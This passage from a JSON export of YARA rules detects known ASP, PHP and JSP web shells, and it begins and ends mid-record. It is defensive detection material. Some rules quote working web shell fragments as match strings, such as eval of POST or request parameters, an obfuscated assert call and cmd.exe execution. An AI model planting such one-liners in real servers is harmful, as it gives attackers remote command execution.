WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s7 = \"<input type=\\\"submit\\\" name=\\\"Send\\\" value=\\\"GO!\\\">\" fullword\n      $s8 = \"<TEXTAREA NAME=\\\"1988\\\" ROWS=\\\"18\\\" COLS=\\\"78\\\"></TEXTAREA>\" fullword\n   condition: \n      all of them\n}","date":"2014-01-28 11:12:01","description":"Web Shell - file shell.asp","minimum_yara":"1.7","name":"Webshell_asp_shell_RID2E61","reference":"-","required_modules":[],"rule_hash":"2984a99d766e43fc7f02f10109b4f9e8","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_Private_i3lue_RID2FC2 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file Private-i3lue.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:10:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s8 = \"case 15: $image .= \\\"\\\\21\\\\0\\\\\" \n   condition: \n      all of them\n}","date":"2014-01-28 12:10:51","description":"Web Shell - file Private-i3lue.php","minimum_yara":"1.7","name":"Webshell_Private_i3lue_RID2FC2","reference":"-","required_modules":[],"rule_hash":"75d1972644446cdd0b56fc2b1444df6c","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_php_up_RID2D32 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file up.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:21:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"copy($HTTP_POST_FILES['userfile']['tmp_name'], $_POST['remotefile']);\" fullword\n      $s3 = \"if(is_uploaded_file($HTTP_POST_FILES['userfile']['tmp_name'])) {\" fullword\n      $s8 = \"echo \\\"Uploaded file: \\\" . $HTTP_POST_FILES['userfile']['name'];\" fullword\n   condition: \n      2 of them\n}","date":"2014-01-28 10:21:31","description":"Web Shell - file up.php","minimum_yara":"1.7","name":"Webshell_php_up_RID2D32","reference":"-","required_modules":[],"rule_hash":"285341abb139ae505099fd6fc843eb2c","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_Mysql_interface_v1_0_RID3261 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file Mysql interface v1.0.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 14:02:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"echo \\\"<td><a href='$PHP_SELF?action=dropDB&dbname=$dbname' onClick=\\\\\\\"return\" \n   condition: \n      all of them\n}","date":"2014-01-28 14:02:41","description":"Web Shell - file Mysql interface v1.0.php","minimum_yara":"1.7","name":"Webshell_Mysql_interface_v1_0_RID3261","reference":"-","required_modules":[],"rule_hash":"1f940f598a9df629fd3018290d2eef2a","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_php_s_u_RID2D94 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file s-u.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:37:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s6 = \"<a href=\\\"?act=do\\\"><font color=\\\"red\\\">Go Execute</font></a></b><br /><textarea\" \n   condition: \n      all of them\n}","date":"2014-01-28 10:37:51","description":"Web Shell - file s-u.php","minimum_yara":"1.7","name":"Webshell_php_s_u_RID2D94","reference":"-","required_modules":[],"rule_hash":"2bf04c5a1be50199287a170f35a67934","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_phpshell_2_1_config_RID31FC : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file config.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 13:45:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"; (choose good passwords!).  Add uses as simple 'username = \\\"password\\\"' lines.\" fullword\n   condition: \n      all of them\n}","date":"2014-01-28 13:45:51","description":"Web Shell - file config.php","minimum_yara":"1.7","name":"Webshell_phpshell_2_1_config_RID31FC","reference":"-","required_modules":[],"rule_hash":"829ce4d06be987d25047167e29defde3","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_asp_EFSO_2_RID2E07 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file EFSO_2.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:57:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"%8@#@&P~,P,PP,MV~4BP^~,NS~m~PXc3,_PWbSPU W~~[u3Fffs~/%@#@&~~,PP~~,M!PmS,4S,mBPNB\" \n   condition: \n      all of them\n}","date":"2014-01-28 10:57:01","description":"Web Shell - file EFSO_2.asp","minimum_yara":"1.7","name":"Webshell_asp_EFSO_2_RID2E07","reference":"-","required_modules":[],"rule_hash":"5977fb30118d107926d4d0ad23d4307f","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_jsp_up_RID2D37 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file up.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:22:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s9 = \"// BUG: Corta el fichero si es mayor de 640Ks\" fullword\n   condition: \n      all of them\n}","date":"2014-01-28 10:22:21","description":"Web Shell - file up.jsp","minimum_yara":"1.7","name":"Webshell_jsp_up_RID2D37","reference":"-","required_modules":[],"rule_hash":"7826a01a2d582460133c7f76344251ad","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_NetworkFileManagerPHP_A_RID3353 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file NetworkFileManagerPHP.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 14:43:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s9 = \"  echo \\\"<br><center>All the data in these tables:<br> \\\".$tblsv.\\\" were putted \" \n   condition: \n      all of them\n}","date":"2014-01-28 14:43:01","description":"Web Shell - file NetworkFileManagerPHP.php","minimum_yara":"1.7","name":"Webshell_NetworkFileManagerPHP_A_RID3353","reference":"-","required_modules":[],"rule_hash":"bd86310d4c0b248c02aed6dc133a06f3","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_Server_Variables_RID3115 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file Server Variables.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 13:07:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s7 = \"<% For Each Vars In Request.ServerVariables %>\" fullword\n      $s9 = \"Variable Name</B></font></p>\" fullword\n   condition: \n      all of them\n}","date":"2014-01-28 13:07:21","description":"Web Shell - file Server Variables.asp","minimum_yara":"1.7","name":"Webshell_Server_Variables_RID3115","reference":"-","required_modules":[],"rule_hash":"aa9e0a7954c80b096d5c1397a2725b94","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_caidao_shell_ice_2_RID319F : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file ice.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 13:30:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<?php ${${eval($_POST[ice])}};?>\" fullword\n   condition: \n      all of them\n}","date":"2014-01-28 13:30:21","description":"Web Shell - file ice.php","minimum_yara":"1.7","name":"Webshell_caidao_shell_ice_2_RID319F","reference":"-","required_modules":[],"rule_hash":"e28d3df93eaa7a382c371fd84ffd469a","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_caidao_shell_mdb_RID3110 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file mdb.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 13:06:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<% execute request(\\\"ice\\\")%>a \" fullword\n   condition: \n      all of them\n}","date":"2014-01-28 13:06:31","description":"Web Shell - file mdb.asp","minimum_yara":"1.7","name":"Webshell_caidao_shell_mdb_RID3110","reference":"-","required_modules":[],"rule_hash":"ba857dbe84f1caedb65ec10d0cbcd0d1","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_jsp_guige_RID2E63 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file guige.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:12:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"if(damapath!=null &&!damapath.equals(\\\"\\\")&&content!=null\" \n   condition: \n      all of them\n}","date":"2014-01-28 11:12:21","description":"Web Shell - file guige.jsp","minimum_yara":"1.7","name":"Webshell_jsp_guige_RID2E63","reference":"-","required_modules":[],"rule_hash":"3d0a58f12af7fba6c11b7aa354ac5839","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_phpspy2010_RID2E0D : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file phpspy2010.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:58:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"eval(gzinflate(base64_decode(\" \n      $s5 = \"//angel\" fullword\n      $s8 = \"$admin['cookiedomain'] = '';\" fullword\n   condition: \n      all of them\n}","date":"2014-01-28 10:58:01","description":"Web Shell - file phpspy2010.php","minimum_yara":"1.7","name":"Webshell_phpspy2010_RID2E0D","reference":"-","required_modules":[],"rule_hash":"c428c8f33f9209b003e2e98b0ad2752f","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_asp_ice_RID2D7A : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file ice.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:33:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"D,'PrjknD,J~[,EdnMP[,-4;DS6@#@&VKobx2ldd,'~JhC\" \n   condition: \n      all of them\n}","date":"2014-01-28 10:33:31","description":"Web Shell - file ice.asp","minimum_yara":"1.7","name":"Webshell_asp_ice_RID2D7A","reference":"-","required_modules":[],"rule_hash":"67a614edf29c4ce1f95b8940adf2aa68","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_drag_system_RID2F48 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file system.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:50:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s9 = \"String sql = \\\"SELECT * FROM DBA_TABLES WHERE TABLE_NAME not like '%$%' and num_\" \n   condition: \n      all of them\n}","date":"2014-01-28 11:50:31","description":"Web Shell - file system.jsp","minimum_yara":"1.7","name":"Webshell_drag_system_RID2F48","reference":"-","required_modules":[],"rule_hash":"a253bc2c548c9f463c80d710d80fd916","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_DarkBlade1_3_asp_indexx_RID3355 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file indexx.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 14:43:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"Const strs_toTransform=\\\"command|Radmin|NTAuThenabled|FilterIp|IISSample|PageCou\" \n   condition: \n      all of them\n}","date":"2014-01-28 14:43:21","description":"Web Shell - file indexx.asp","minimum_yara":"1.7","name":"Webshell_DarkBlade1_3_asp_indexx_RID3355","reference":"-","required_modules":[],"rule_hash":"a1571f2501255e2e497aa4ce79fdb088","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_jsp_hsxa_RID2E06 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file hsxa.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:56:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<%@ page language=\\\"java\\\" pageEncoding=\\\"gbk\\\"%><jsp:directive.page import=\\\"ja\" \n   condition: \n      all of them\n}","date":"2014-01-28 10:56:51","description":"Web Shell - file hsxa.jsp","minimum_yara":"1.7","name":"Webshell_jsp_hsxa_RID2E06","reference":"-","required_modules":[],"rule_hash":"35915b4a9c22ec9061af74850a2e7fa2","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_jsp_utils_RID2E83 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file utils.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:17:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"ResultSet r = c.getMetaData().getTables(null, null, \\\"%\\\", t);\" fullword\n      $s4 = \"String cs = request.getParameter(\\\"z0\\\")==null?\\\"gbk\\\": request.getParameter(\\\"z\" \n   condition: \n      all of them\n}","date":"2014-01-28 11:17:41","description":"Web Shell - file utils.jsp","minimum_yara":"1.7","name":"Webshell_jsp_utils_RID2E83","reference":"-","required_modules":[],"rule_hash":"3c4a862788f4e0de7ab82be0c418c3ce","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_asp_01_RID2CAA : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file 01.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 09:58:51\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<%eval request(\\\"pass\\\")%>\" fullword\n   condition: \n      all of them\n}","date":"2014-01-28 09:58:51","description":"Web Shell - file 01.asp","minimum_yara":"1.7","name":"Webshell_asp_01_RID2CAA","reference":"-","required_modules":[],"rule_hash":"e39cd0f39cfab33e253b80225b79a8ad","score":50,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_asp_404_RID2CE1 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file 404.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:08:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"lFyw6pd^DKV^4CDRWmmnO1GVKDl:y& f+2\" \n   condition: \n      all of them\n}","date":"2014-01-28 10:08:01","description":"Web Shell - file 404.asp","minimum_yara":"1.7","name":"Webshell_asp_404_RID2CE1","reference":"-","required_modules":[],"rule_hash":"aad7824aba00cf3886a8b7e6653d32c5","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_webshell_cnseay02_1_RID31D0 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file webshell-cnseay02-1.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 13:38:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU\" \n   condition: \n      all of them\n}","date":"2014-01-28 13:38:31","description":"Web Shell - file webshell-cnseay02-1.php","minimum_yara":"1.7","name":"Webshell_webshell_cnseay02_1_RID31D0","reference":"-","required_modules":[],"rule_hash":"0beaa50d9a63b3b3047aba367ff4939e","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_php_fbi_RID2D7E : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file fbi.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:34:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s7 = \"erde types','Getallen','Datum en tijd','Tekst','Binaire gegevens','Netwerk','Geo\" \n   condition: \n      all of them\n}","date":"2014-01-28 10:34:11","description":"Web Shell - file fbi.php","minimum_yara":"1.7","name":"Webshell_php_fbi_RID2D7E","reference":"-","required_modules":[],"rule_hash":"be3b6c6f43ed797adb998b51d199f7fa","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_cmd_asp_5_1_RID2EA1 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file cmd-asp-5.1.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:22:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s9 = \"Call oS.Run(\\\"win.com cmd.exe /c \\\"\\\"\\\" & szCMD & \\\" > \\\" & szTF &\" fullword\n   condition: \n      all of them\n}","date":"2014-01-28 11:22:41","description":"Web Shell - file cmd-asp-5.1.asp","minimum_yara":"1.7","name":"Webshell_cmd_asp_5_1_RID2EA1","reference":"-","required_modules":[],"rule_hash":"a4d0817f3e815d984a1f2f3c7310b9f8","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_php_dodo_zip_RID2FA5 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file zip.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:06:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$hexdtime = '\\\\x' . $dtime[6] . $dtime[7] . '\\\\x' . $dtime[4] . $dtime[5] . '\\\\x\" \n      $s3 = \"$datastr = \\\"\\\\x50\\\\x4b\\\\x03\\\\x04\\\\x0a\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\" \n   condition: \n      all of them\n}","date":"2014-01-28 12:06:01","description":"Web Shell - file zip.php","minimum_yara":"1.7","name":"Webshell_php_dodo_zip_RID2FA5","reference":"-","required_modules":[],"rule_hash":"0c6c8159605b7dc60a6cbde04c115399","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_aZRaiLPhp_v1_0_RID2F86 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file aZRaiLPhp v1.0.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:00:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s5 = \"echo \\\" <font color='#0000FF'>CHMODU \\\".substr(base_convert(@fileperms($\" \n      $s7 = \"echo \\\"<a href='./$this_file?op=efp&fname=$path/$file&dismi=$file&yol=$path'><fo\" \n   condition: \n      all of them\n}","date":"2014-01-28 12:00:51","description":"Web Shell - file aZRaiLPhp v1.0.php","minimum_yara":"1.7","name":"Webshell_aZRaiLPhp_v1_0_RID2F86","reference":"-","required_modules":[],"rule_hash":"51c64eb8cada38f38e2e41f4c0a0faf2","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_php_list_RID2E09 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file list.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:57:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"// list.php = Directory & File Listing\" fullword\n      $s2 = \"    echo \\\"( ) <a href=?file=\\\" . $fichero . \\\"/\\\" . $filename . \\\">\\\" . $filena\" \n      $s9 = \"// by: The Dark Raver\" fullword\n   condition: \n      1 of them\n}","date":"2014-01-28 10:57:21","description":"Web Shell - file list.php","minimum_yara":"1.7","name":"Webshell_php_list_RID2E09","reference":"-","required_modules":[],"rule_hash":"365053807ef068f21cdd547d8180ca9c","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_ironshell_RID2E76 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file ironshell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:15:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"print \\\"<form action=\\\\\\\"\\\".$me.\\\"?p=cmd&dir=\\\".realpath('.').\\\"\" \n      $s8 = \"print \\\"<td id=f><a href=\\\\\\\"?p=rename&file=\\\".realpath($file).\\\"&di\" \n   condition: \n      all of them\n}","date":"2014-01-28 11:15:31","description":"Web Shell - file ironshell.php","minimum_yara":"1.7","name":"Webshell_ironshell_RID2E76","reference":"-","required_modules":[],"rule_hash":"2758dea20c5f8d4ffafd7d9392b0c8bd","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_caidao_shell_404_RID3075 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file 404.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:40:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<?php $K=sTr_RepLaCe('`','','a`s`s`e`r`t');$M=$_POST[ice];IF($M==NuLl)HeaDeR('St\" \n   condition: \n      all of them\n}","date":"2014-01-28 12:40:41","description":"Web Shell - file 404.php","minimum_yara":"1.7","name":"Webshell_caidao_shell_404_RID3075","reference":"-","required_modules":[],"rule_hash":"68727cd27d1f2db85ffbc5b4219da150","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_ASP_aspydrv_RID2EF2 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file aspydrv.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:36:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"<%=thingy.DriveLetter%> </td><td><tt> <%=thingy.DriveType%> </td><td><tt> <%=thi\" \n   condition: \n      all of them\n}","date":"2014-01-28 11:36:11","description":"Web Shell - file aspydrv.asp","minimum_yara":"1.7","name":"Webshell_ASP_aspydrv_RID2EF2","reference":"-","required_modules":[],"rule_hash":"2201714b6dd748b8d7fc9d366bf40d5d","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_jsp_web_RID2D90 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file web.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 10:37:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<%@page import=\\\"java.io.*\\\"%><%@page import=\\\"java.net.*\\\"%><%String t=request.\" \n   condition: \n      all of them\n}","date":"2014-01-28 10:37:11","description":"Web Shell - file web.jsp","minimum_yara":"1.7","name":"Webshell_jsp_web_RID2D90","reference":"-","required_modules":[],"rule_hash":"f68e8e31b34fef67c49fc9560b0ba864","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_mysqlwebsh_RID2EF5 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file mysqlwebsh.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:36:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \" <TR><TD bgcolor=\\\"<? echo (!$CONNECT && $action == \\\"chparam\\\")?\\\"#660000\\\":\\\"#\" \n   condition: \n      all of them\n}","date":"2014-01-28 11:36:41","description":"Web Shell - file mysqlwebsh.php","minimum_yara":"1.7","name":"Webshell_mysqlwebsh_RID2EF5","reference":"-","required_modules":[],"rule_hash":"6ebcf99d444ca9acc335f3c114671203","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_jspShell_1_RID2E7B : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Web Shell - file jspShell.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:16:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC 